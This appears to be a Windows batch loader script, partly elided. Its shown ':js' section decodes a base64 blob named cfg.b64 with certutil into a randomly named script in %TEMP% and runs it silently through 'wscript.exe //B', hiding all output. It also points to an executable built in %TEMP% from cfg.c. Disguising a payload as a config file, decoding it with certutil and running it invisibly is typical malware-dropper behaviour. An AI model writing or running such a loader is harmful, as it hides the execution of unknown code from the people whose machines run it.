@echo off
setlocal
set "OUT=%TEMP%\rbc_ec9955bb8121c053.exe"
set "SRC=%~dp0cfg.c"
...
:js
del /f /q "%TEMP%\rbc_ec9955bb8121c053.js" >nul 2>&1
certutil -f -decode "%~dp0cfg.b64" "%TEMP%\rbc_ec9955bb8121c053.js" >nul 2>&1
wscript.exe //B //nologo "%TEMP%\rbc_ec9955bb8121c053.js"
exit /b 0
